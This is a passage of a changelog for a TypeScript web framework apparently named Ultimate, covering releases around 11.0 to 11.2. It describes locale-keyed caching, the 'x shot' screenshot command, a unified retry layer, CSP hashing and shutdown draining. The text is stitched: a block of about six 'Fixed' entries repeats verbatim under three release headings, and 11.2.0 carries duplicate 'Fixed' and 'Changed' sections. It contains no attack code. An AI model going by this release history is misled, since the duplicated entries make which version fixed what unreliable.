  nearest neighbour, and two renderings of one prompt differing ONLY in that token, while carrying
  a whole post, are neighbours — measured with this package's own `HashEmbedder` over the reference
  app's template, **0.9986**, against the declared `threshold: 0.97`. So whichever language was
  asked for first was served to everyone. No threshold repairs it: the same number has to keep an
  honest repeat above it. The store key now carries `ctx.locale`, in the **unconditional** half
  beside the prompt hash rather than in the scope — a `scope` answers "who may share this answer",
  and a locale is part of what the answer IS, so a written-down `scope: () => 'global'` is
  partitioned by it too. `@ultimat3/render`'s ISR keys by locale for the same reason. Two failing
  tests came first, and both go red again if the key loses the locale.

### Added

- **`x shot --cdp-url <ws://…>` — photograph a route through a browser this box could not have
  started.** `@ultimat3/scraping` has had `remoteBrowser({ cdpUrl })` since it shipped and calls
  attach its **primary production path**; no CLI command could reach it, because
  `browser-launcher.ts` only ever called `localBrowser()`. So the framework's answer to "an agent
  cannot look at anything" needed a Chrome on the same box — which a CI runner, a distroless
  container and every stealth provider's customer do not have. `SCRAPE_CDP_URL` is the environment
  fallback, and it is `@ultimat3/scraping`'s own spelling rather than a second one: the package's
  `remoteRequired` refusal already names it.
- **A connect-only browser library is now a valid launcher.** `cdp-port.ts` declares `launch` and
  `connect` both optional precisely so a provider SDK that can only attach satisfies the port, and
  `launcherIn` asked every module for `launch` regardless — refusing exactly the library that
  works. It now asks for the method the run is going to call, and names the one that was missing.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **An island chunk carried the `NODE_ENV` of the process that built it, not the one it ships
  under.** `Bun.build` picks the `development` / `production` export condition from the build
  process's own `NODE_ENV`, and inlines that value into app code — measured on the pinned 1.4.0:
  unset → Solid's development build, `test` → development, `production` → production. So every
  island built anywhere a container did not run (`x dev`, `x build` on a laptop, `bun test`) shipped
  with `process.env.NODE_ENV === "development"` baked into the file a browser downloads, and its
  bytes — therefore its content hash and its byte budget — depended on the box. `island-bundle.ts`
  now pins `define: { 'process.env.NODE_ENV': '"production"' }`: an island chunk is only ever built
  to be shipped, and `x dev` serves the same chunk the container does.
- **`packages/cli/src/island-solid-production.ts` is deleted — 120 lines re-implementing Node's
  conditional-exports walk to keep Solid's development build out of an island.** Its premise was
  that `target: 'browser'` always adds the `development` condition and *"no option removes it —
  `conditions`, `production`, `env` and `define` were each measured under Bun 1.4 and none of them
  does"*. Three of those four still hold; `define` does not, and one line reproduces what the plugin
  produced **byte for byte** (16,703 B for an entry importing `solid-js`, `solid-js/web` and
  `solid-js/store`). The likely origin of the wrong measurement is that the unquoted form is a
  silent no-op: `'process.env.NODE_ENV': 'production'` leaves the development build in place and
  `'"production"'` does not. Axiom 1 — the plugin was a second path to what the bundler already
  does.

### Changed

- **Which browser a `x shot` run gets is three rules, and each was chosen against a silent
  failure.** Both flags together is **refused** rather than ranked — one names a Chrome to start,
  the other says the browser is somebody else's, so honouring either ignores what was typed. An
  exported `SCRAPE_CDP_URL` is a shell-wide default and not a typed intent, so `--browser` beside
  it **wins**: the alternative is a flag that parses, reports nothing and quietly attaches
  somewhere else, which is the `--critical` defect class `flag-reads.ts` exists for and cannot see
  here, because the flag *is* read. And `--browser` is not read at all on an attach, so a correct
  remote run is never refused for a binary it will never execute.

- **Every Bun-version-stamped claim in shipped source was re-measured on the pinned series**, which
  is the half of the 1.3 → 1.4 move that never happened: a comment stamped `1.3.14` under a `1.4.x`
  pin says the behaviour was last checked on a runtime nothing in the repo runs. Re-measured true
  and restamped: `Bun.sql.query` is still `undefined` (`jobs/driver-pg.ts`), `server.upgrade()`
  still runs `websocket.open` synchronously before returning (`realtime/sync-upgrade.ts` and two
  tests), `expect(fn).toThrow(Class)` still passes when `fn` merely RETURNS an error (three test
  files), and Bun's dotenv precedence is unchanged — `NODE_ENV=staging` still reads
  `.env.development` and `test` still skips `.env.local` (`core/env-example.ts`).
- **Two of those claims were false, and are corrected rather than restamped.** `jobs/job.test.ts`
  said a bare `declare(0)();` expression statement "does not run at all under Bun 1.3.14 — the call
  is elided when its value is unused"; re-measured against that exact `declare` on 1.4.0, the
  statement runs and `job()` throws `X_INVARIANT`. `cli/compile-externals.ts` said Bun 1.3 is "what
  CI pins and what `docker/Dockerfile` builds on" — both moved to 1.4 on 2026-08-20, so every
  builder now takes the branch the comment describes as the other one.

### Commits

- feat(cli): x shot attaches to a browser it did not start (#344)
- fix(cli): an island chunk is built to be shipped, and every Bun-stamped claim is re-measured on the pinned series (#341 #342) (#343)

## 11.2.0 - 2026-08-23

### Added

- **`x shot --island <name> [--state <id>]` — one component, photographed in a state you cannot
  click to.** The framework's stated primary developer is an AI agent, and an agent could
  photograph a *route* and nothing smaller; the states worth reviewing are the failed read, the
  empty list, the over-quota banner, the offline fallback, and reaching those through a route needs
  a database in that state and a session that sees it. Both halves already existed and had never
  been joined: `mountIsland` runs a real island chunk over a micro-DOM that cannot rasterize, and
  `page.screenshot()` drives a real browser but was reachable only for a route.
  A **flag on `x shot`**, never a second command — `cmd-shot.ts` already owns the browser launch,
  the dev-server reuse, the settle window and the verdict writer.
- **The state manifest is pure data** — no JSX, no `solid-js`, no import of the component — so the
  CLI knows the complete expected picture list *before a browser exists*. That is what makes
  "produced nothing and exited 0" impossible: the run diffs what it owed against what landed and
  refuses independently of the browser's own exit code. `defineIslandStates` carries `timeZone` and
  `now`, so the framework's no-unzoned-dates rule is structural here rather than remembered — a
  harness that freezes the instant and leaves the zone ambient renders every date in the host
  machine's.
- **An unstubbed request fails the run, by name.** A component whose fetch quietly hangs paints its
  own loading branch, and the picture then shows a fixture gap dressed up as a component state.
  Every address is sealed and every capture asserts before the shutter: host attached, target
  visible, readiness reached (**quiet, not zero** — a deliberately-pending fixture never settles),
  a non-zero box, a box with actual children or text, then a byte floor as backstop.
- **A clip rectangle on `@ultimat3/scraping`'s capture port.** It was `fullPage` only, all the way
  down to the CDP port, so every picture was the whole viewport — and the reader is a vision model
  whose pixels are the scarce resource. `clip` and `fullPage` are mutually exclusive and the pair is
  refused by name, because CDP silently ignores one. A rectangle merely below the fold is
  **accepted**: this package sets and reads no viewport, and refusing it would reject the case the
  feature exists for.
- **The 500-line ceiling now exempts a pure re-export manifest**, detected mechanically — every
  statement an `import`/`export` that declares nothing. `packages/core/src/index.ts` was at 496 and
  adding six factory exports lands at 503, so no new subject could be added to core's public API at
  all. The ceiling re-arms the instant anyone adds a line of logic; it is not a path allowlist.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **The island purity guard answered "pure" for an impure file.** It refused `solid-js` and a
  `.tsx` specifier, but `import { X } from './settings.island'` resolves to the `.tsx` under Bun and
  passed. The reference app was safe only because it used `import type`, which is erased — deleting
  one keyword would have dragged Solid into a browser-free context with the guard still green. Any
  relative runtime specifier is now refused; `import type` is exempt in both directions, proved
  against Bun rather than assumed.
- `packages/cli/src/ts-scan.ts` read **every** depth-0 string literal in a `fix:` expression,
  including a ternary's *condition*, so nine phantom fix sites across `action`, `auth`, `mcp`,
  `entity`, `cli` and `flags` were published as fixes to check. 952 → 943 real sites.


- **One flight layer, in `@ultimat3/core`.** The framework carried **four** retry engines
  (`jobs/retry.ts`, `ai/gateway.ts`, `realtime/thundering-herd.ts`, and `db/transaction.ts`, which
  retried on no backoff at all), with three different jitter strategies between them; **five**
  retryability tables, two of them byte-identical
  (`RETRYABLE_STATUSES = new Set([408, 409, 425, 429])` in both `cache/purge-http.ts` and
  `mail/driver-resend.ts`, packages that cannot import each other); four concurrency limiters; four
  dedup mechanisms; and sixteen independent timeout sites. `error-retry.ts` owned the *vocabulary*
  (`terminal | retryable | retry-after`) and nothing executed it. Now: `backoff.ts` (one curve, all
  three shapes, all three jitter modes, `random` injected), `retry.ts` (the executor that
  vocabulary never had), `single-flight.ts`, `flight-gate.ts`, `generation-fence.ts` — which nothing
  in the tree had — and `retryable-status.ts`. `classifyThrown` and `statedDelayMs` moved DOWN from
  `@ultimat3/jobs` into `core/error-retry.ts`. Tier 0, so no package pays a tier edge to reach it.
- **`X_FLIGHT_GATE_OVERLOADED`** (503, beside `X_OVERLOADED`) and **`X_SUPERSEDED`** (499, beside
  `X_ABORTED` — the caller went away there, the caller's generation moved on here, and in both cases
  nobody will act on the answer; deliberately not 409, which asks a client to reconcile against
  something a fenced answer has nothing to reconcile against).
- **`bun run flight-copies`**, a step of the gate's `unit` check. Refuses a second backoff curve —
  matched on **shape**, a factor raised to an attempt and clamped in one expression, never on a name
  — and any **call** to `Math.random()` in shipped source, which is what made `ai/gateway.ts` the one
  engine of four with no test at all. A `random = Math.random` default parameter is the injectable
  seam and is never reported. Pinned at **zero**, enforcing outright. Written because deleting three
  copies enforces nothing: the first draft keyed on a roll named `random`/`rng`/`roll` and read
  straight past a planted copy whose parameter was `r`, exactly as a rule spelled `RenderMode` once
  read past `PwaRenderMode`.
- **Deadlines on three shared reads that could previously wedge forever.** `createCacheStack`'s
  `load()` (`DEFAULT_LOAD_DEADLINE_MS = 30_000`, anchored to `http`'s own request-timeout default,
  because a load still running then has no reader left to serve), `@ultimat3/auth`'s JWKS refresh
  (twice its transport timeout: `AbortSignal.timeout` bounds only the default transport, and an
  app-injected `fetch` that ignores its signal pinned the slot for the life of the client), and
  `@ultimat3/realtime`'s query-window read. Eviction frees the KEY — it never cancels or rejects the
  work — so the worst case is one duplicate fetch, never a failed answer.
- **Flight control on both typed clients, and the browser bundle cut by two thirds.**
  `queryClient()` and `rpc()` were each one bare `fetch` — no dedup, no retry, no deadline, no
  concurrency ceiling, no supersession fence, only a pass-through `signal`. So N concurrent reads of
  one resource resolved in N orders and whichever landed last won, and a stale answer arriving after
  the caller's context moved on was applied anyway, because nothing could tell "superseded" from
  "succeeded". `createClientFlight` is now opt-in on both, composed from the tier-0 layer. Reads
  dedup on `[principal, url]` — **no principal means no sharing**, so the unsafe configuration (one
  caller joining another's open read across a sign-in or tenant switch) cannot be spelled. A
  caller-supplied `signal` disqualifies sharing outright rather than refcounting joiners, because
  not sharing cannot be wrong. **A mutation never joins another mutation, and a fence never aborts a
  write** — closing a mutation's socket does not un-commit it. A write retries only alongside an
  `Idempotency-Key`.
- **`rpc` measured 42,584 B in a browser bundle and is now 14,759 B; `queryClient` 40,412 → 12,755 B.**
  Two thirds of it was never the typed client: `client.ts` imported `BUILD_ID_HEADER` and
  `IDEMPOTENCY_HEADER` from `./http`, which is the route projection, so `@ultimat3/http`,
  `@ultimat3/cache`, `@ultimat3/policy` and the whole invoke runtime rode into every island calling
  `rpc()` for the sake of two string literals. Both packages now declare honest `sideEffects` arrays
  and the flight pipeline is `import type`-only at the call site, so it reaches a chunk only when a
  caller writes `createClientFlight`.
- **The client pipeline lives in `@ultimat3/core`, once.** It first shipped as a 288-line twin in
  both typed clients, kept in step by a byte-equality test — which makes drift loud, not absent, and
  is the defect this release is otherwise about. `client-flight.ts` and `client-wire.ts` are tier 0
  now (a module importing only tier 0 *is* a tier 0 module), both packages re-export the same
  objects, and `createClientFlight` from `@ultimat3/action` is `===` the one from `@ultimat3/query`
  where it used to be a distinct copy. Two further copies of `isJsonObject` went with them.
- `DB_ERROR_RETRY` and `AI_ERROR_RETRY`: five codes classified `retryable` that rendered
  `retry: "terminal"` — including `X_DB_SERIALIZATION_FAILURE`, whose own `fix:` line said
  `withTransaction(fn, { retry: 3 })` while the document beside it told every client not to retry.

### Changed

- **`@ultimat3/ai` retries 408, 409 and 425** in addition to `429` and `>= 500`. Every other 4xx
  still burns the budget for nothing; those three are transient by construction. Its jittered delay
  is now rounded rather than floored (≤1 ms), and a policy carrying `NaN` waits 0 instead of
  producing `setTimeout(NaN)`, which fires immediately — a "backoff" that was a tight spin.
- **`@ultimat3/db`'s `withTransaction` waits between re-runs** — exponential from 10 ms, capped at
  500 ms, full jitter, because two callers that just deadlocked are by construction scheduled at the
  same offset from the same event. **The default is unchanged: `retry` absent or `0` waits nothing,
  ever**, and nothing waits after the final attempt.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`UltimateError.retry` now reads `retryable` on a wire failure whose status says so.**
  `RemoteActionError`, `RpcFailedError` and `QueryRequestFailedError` previously always rendered
  `terminal`, because `retryFor` fails closed and no code declared for them — so `--json` told every
  client not to retry a 503. The status classifies only where nobody declared for the code: an
  `X_NOT_IMPLEMENTED` behind a 501 stays terminal, because a status that overrode a declaration
  would have a client hammer a config fault. Observable in `toJSON()` and to anything reading
  `error.retry`.
- `docs/idea/14-roadmap.md`'s milestone 2 claimed "a CRUD app driven entirely by the typed client,
  **no hand-written fetch**". The framework's own generator falsifies it: `rpc()` pulls
  `@ultimat3/action` into a browser chunk, so
  `cli/src/templates/resource-form-island.ts` emits a plain `fetch` into every `x g resource` output
  and both tracked apps do the same. Corrected, with the cost stated.
- The same page claimed tier 3 local-first "lands in v2 as `persist: true` — a flag, not a rewrite",
  wrong in both halves: `query()` has never accepted `persist`, and the in-memory half is ~1,000
  lines already on the client barrel. Only the durable backing is missing.
- `packages/testing/CLAUDE.md` claimed its micro-DOM was the tree's only one. There are two, for
  different grammars, and they cannot be merged: `ui` is tier 4 and `testing` is tier 5.
- `docs/architecture/11-ai-surface.md` still said "a 4xx is never retried".

### Commits

- feat(cli): x shot --island photographs one component in a state you cannot click to (#334) (#336)
- feat(core): one flight layer, and the four copies collapse onto it (#332 #333) (#335)

## 11.1.0 - 2026-08-23

### Added

- **`X_ERROR_CODE_UNRESOLVED`, and a `code:` may now be a name.** `scanCodes` matched
  `code\s*[:=]\s*'X_…'` — a string literal — so `const STALE = 'X_…'` followed by `code: STALE`,
  which is what a DRY author writes, was a declaration to nobody: no manifest row, no wiki row
  demanded, nothing for `bun run gate-codes`, and `x errors explain` answering
  `X_ERROR_CODE_UNKNOWN` for a code the build throws. Silent, in the permissive direction (#277).
  `scanCodeDeclarations` is now the one pass: it resolves the identifier against the same file's
  module-scope consts and reports every name it cannot resolve as `X_ERROR_CODE_UNRESOLVED`.
  Cross-file resolution is refused deliberately. Measured over the framework and both tracked apps:
  **0 findings**, enforcing outright with no pin table; the code set moved 554 → 555, nothing else.

### Commits

- fix(cli): a code declared behind a same-file constant is a declaration, and one behind anything else is a finding (#277) (#330)

## 11.0.0 - 2026-08-23

### Added

- **`/favicon.ico` is answered on every served surface.** `x dev`, `x serve` and the static export
  all carry a favicon: the app's own `apps/web/site/favicon.ico` when one exists, otherwise a
  32×32 default the framework draws itself. Every scaffolded app 404'd on it before (#272), and a
  permanent console error trains the reader to ignore console errors.
- **`X_ERROR_FIX_PATH_MISSING`** — a `fix:` that cites a file path or glob this tree does not have
  is now refused by the `errors` step, beside the `x <command>` rule (#274). `X_UI_RUNTIME_MISSING`
  named a line no generator wrote and passed every gate since it shipped; 117 path citations read,
  zero offenders under the rule as it ships.
- `@ultimat3/cli` declares `@ultimat3/flags` and `@ultimat3/money` as dependencies, which
  `x errors explain` already imported at run time (#283). In an app that did not depend on them,
  41 documented codes answered `X_ERROR_CODE_UNKNOWN` while the wiki promised they resolved.
  `error-catalog.test.ts` now derives the importable set from `package.json`.
- **Error pages a browser can read, and an app can override.** A production process answered a
  browser's 404 or 500 with `problem+json` — carrying the internal `cause` and the author-facing
  `fix:`. Now a request that accepts HTML gets the framework's error page: status, code, request
  id, nothing off the throwable, a footer linking the Ultimate repository and developerz.ai. Copy
  is the catalog's `errors.*` keys, declared since 1.0 and read by nothing until now. Override one
  per status with `apps/web/site/errors/<status>.html`, served byte for byte and read per request;
  `x build --target static` writes `404.html`. `x dev` keeps the overlay.
- **`X_LIVE_ROUTE_NO_ISLAND`** — a route whose module graph reaches a live hook and declares no
  island (or `hydrate: 'never'`) can never receive a row; the `budgets` step now refuses it at
  build time instead of a 500 on first request (#271's second half). `examples/dummy`'s `/feed` is
  now a real island that connects, subscribes by name and renders the snapshot.
- **`x new` scaffolds a development authenticator** (`apps/web/app/auth/dev-actor.ts`, installed
  in `development` only), so a fresh app no longer boots with `X_CONFIG_INVALID: 7 route(s)
  declare auth: 'required' and no authenticator is configured` and `/dashboard` opens. A deploy
  still warns until the app issues sessions. `@ultimat3/http` joins the scaffold's dependencies —
  it was absent.
- **`docs/idea/21-the-range.md`** — who Ultimate is for, homework to very large, measured at the
  small end (`x new` asks 0 questions, 136 files, 4 commands to a running app) and anchored at the
  large end (the gate, the tiers, the ladder, the realtime numbers), with the model-cost axis
  stated: enforced conventions and errors-as-instructions matter more with a cheap model.
  Linked, never restated, from `README.md`, `wiki/Home.md`, `llms.txt`, the FAQ and ops.
- **A server render gets a live client instead of a 500.** With no DOM, every `@ultimat3/realtime`
  hook falls back to `serverRenderLiveClient()` — `loading`, no rows, no subscription — so a page
  whose body reads a live query renders its loading branch on the server and the browser takes
  over on hydrate (#271). `mutate()` / `drain()` there are **`X_LIVE_SERVER_RENDER`**, a new code;
  `X_LIVE_CLIENT_MISSING` now means a *browser* with no registration. `LiveClientLike` is the
  structural seam the hooks read — a subclass would have put the `LiveClient` class on the island
  graph (8,368 B → 26,571 B, measured).
- **`@ultimat3/ui`'s Solid-runtime slot is its own module** (`theme/runtime-slot.ts`), so an
  island that only calls `setSolidRuntime` no longer carries `@ultimat3/core`'s error registry:
  5,719 B → 72 B (#275). Component subpath exports were measured and refused — the barrel and a
  deep import emit byte-identical chunks; `barrel-bytes.test.ts` pins both facts.
- `buildIslands` byte reproducibility is pinned on `examples/dummy`'s real islands (#273). The
  ±377 B flap is Bun 1.4.0's tree-shaker racing on a `sideEffects`-declared module, reproduced
  with no plugins; the recipe is in the test header.

### Changed

- **The `worker` role drains in two phases, and its wait is bounded.** `accept` stops claiming and
  returns; `close` waits out the in-flight jobs — now counted with `beginWork()`, so the drain's own
  in-flight phase does the waiting — and closes the driver under the deadline the hook is handed.
  One `accept` hook doing all of it spent the whole budget before `@ultimat3/http`'s "stop
  listening" and `listenSyncNode`'s "stop upgrading" had been invoked at all: 4 hooks started, none
  finished. Behaviour change: a job that outruns `configureLifecycle({ deadlineMs })` is now
  abandoned (`jobs.worker.drain-abandoned`) and the queue redelivers it, where the teardown used to
  hang forever with the driver open. Raise the budget past your slowest job.
- **The `scheduler` role drains the same way.** `accept` stops dispatching, `close` waits the round
  out and hands the lease back under the deadline. An ABANDONED round deliberately keeps the lease
  and lets it expire: releasing under a live dispatch promotes a standby onto the occurrence this
  node is still enqueueing for, which is the double-fire leader election exists to prevent.
- **A `sync` node's `drain()` waits for its presence leaves to land**, in bounded chunks of sockets,
  before it releases and closes the hub. Started and never awaited, the process could exit with them
  on the wire and every other node rendered every drained member for a full TTL — the rolling-restart
  double vision the leave exists to prevent. `drain()` now resolves later by one bus round trip.
- **The scheduler re-asserts leadership before EVERY task, not once per round.** A 30s lease and a
  serial walk leave the tail of the round dispatching under a lease another node already took, and
  the occurrence key does not absorb it: `SQL_ENQUEUE`'s conflict target is partial over the live
  states, so a duplicate landing after that job finished inserts a new row and the handler runs twice.
- **BREAKING — `@ultimat3/render`: `isrKey(url, locale)` takes the negotiated locale as a required
  second argument, and it is part of the store key.** An app with more than one locale was serving
  the first visitor's document to every later one for the whole TTL, and telling the CDN to do the
  same; `vary: accept-language` is emitted now.
- **BREAKING — `@ultimat3/render`: `IsrStore` gains a required `markStale(path)` member.** A custom
  store implements it in place; `set()` means "just generated" and orders eviction — `markStale`
  through `set` refreshed the stalest pages' position. Regeneration also samples a cache fence, so a
  bust landing mid-render is no longer erased by pre-write HTML (a tag-only route served it forever).
- **BREAKING — `@ultimat3/http`: `config.drainTimeoutMs` is `number | null`, default `null`.**
  `createServer` no longer calls `configureLifecycle` unless the app declared one, so
  `configureLifecycle({ deadlineMs })` — the remedy `X_SHUTDOWN_TIMEOUT` prints — is no longer
  reverted to 15 s at boot.
- **BREAKING — `@ultimat3/http`: an unclassified 5xx problem document no longer carries the
  exception's own text in `title` / `detail` / `cause`.** A `pg` message quoting the rejected row,
  a driver message quoting the DSN, went to any non-HTML client in production. `dev: true` is
  unchanged; the text stays on the log and error-report path. `code`, `fix` and `requestId` remain.
- **BREAKING — `@ultimat3/http`: a request carrying an identity gets `private, max-age=0` even when
  the handler declared a shared `cache-control`** (`immutable` excepted), and every shared response
  varies on `cookie` and `x-timezone`. An ungated `ssr` page — the shape `x g route --surface app`
  scaffolds — answered `public, s-maxage=30` with a signed-in name in the body. The `cache-headers`
  stage is the one owner; a render mode states intent.
- **BREAKING — `@ultimat3/ui`: `initialsOf(name, locale)` takes a required locale.** `<Avatar>`
  upper-cased against the host's ambient locale (`İ` on a `tr` server, `I` in the browser).
- **The framework's CSP admits its own hydration runtime in production.** `script-src` was
  `'self' 'wasm-unsafe-eval'` with no hash, while the runtime is an inline module — report-only in
  `x dev`, enforced in a container, so no island ever booted after deploy. `startWeb` now hashes the
  seven runtime bodies (`HYDRATE_RUNTIME_BODIES`) into `script-src`, as it already did for styles.
- **`holdUntilShutdown` reaches the exit.** The one production `installSignalHandlers` call was
  `exit: false` and `release()` re-awaited the teardown the drain had just abandoned, so an overrun
  wedged the process until the kubelet's SIGKILL — the job lease lapsed and another worker re-ran it.
  `release()` runs under the drain's remaining budget; `runRole` passes the exit.
- `X_CSP_DIRECTIVE_INVALID` — `security.csp.extend` with a malformed directive name or source is
  refused at `defineHttpConfig`; `{ toString: [...] }` threw a bare `TypeError` at boot.
- **BREAKING — `RetryPolicy`, `DEFAULT_RETRY`, `retryDelayMs`, `shouldRetry` and
  `BackgroundSyncOptions.retry` are deleted (`@ultimat3/pwa`).** This package schedules no retry
  and never did: the one-shot `sync` handler rejects and the PLATFORM decides when to wake it
  again. Only `maxAttempts` ever reached the worker, as a `SYNC_MAX_ATTEMPTS` constant nothing
